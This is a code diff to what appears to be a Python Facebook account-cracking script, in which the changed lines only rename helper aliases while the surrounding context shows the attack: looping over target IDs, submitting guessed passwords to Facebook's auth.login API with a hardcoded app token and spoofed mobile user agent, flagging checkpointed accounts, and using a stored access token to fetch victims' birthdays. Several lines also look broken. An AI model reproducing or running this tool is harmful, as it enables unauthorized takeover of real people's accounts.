@@ -132,7 +132,7 @@ class __crack__:
 		try:
 			self.apk = input(" [*] File Name : ")
 			print (' [*]=============================================')
-			self.id = IMTIAZ(self.apk).read().splitlines()
+			self.id = IQRA(self.apk).read().splitlines()
 			IQRA_BRAND(' [*] Total ID : %s'%(len(self.id)))
 			print (' [✓] Are You Went To Continue : Type Y')
 		except:
@@ -227,7 +227,7 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = IQRA('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			p = Prof_IQRA("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
@@ -240,7 +240,7 @@ class __crack__:
 				continue
 			elif "www.facebook.com" in p["error_msg"]:
 				try:
-					token = IMTIAZ('login.txt').read()
+					token = IQRA('login.txt').read()
 					cp_ttl = Prof_IQRA('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
@@ -271,7 +271,7 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = IQRA('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			ses = requests.Session()
@@ -289,7 +289,7 @@ class __crack__:
 				continue
 			elif 'checkpoint' in ses.cookies.get_dict():
 				try:
-					token = IMTIAZ('token.txt').read()
+					token = IQRA('token.txt').read()
 					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month].IQRA_BRAND('\r\033[1;91m[Checkpoint-IQRA] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
@@ -319,7 +319,7 @@ class __crack__:
 			try: os.mkdir('')
 			except: pass
 			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
+				ua_xiaomi = IQRA('agent.txt', 'r').read()
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 			ses = requests.Session()
@@ -337,7 +337,7 @@ class __crack__:
 				continue
 			elif 'checkpoint' in ses.cookies.get_dict():
 				try:
-					token = IMTIAZ('token.txt').read()
+					token = IQRA('token.txt').read()
 					cp_ttl = Prof_IQRA('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
 					month = bulan_ttl[month]
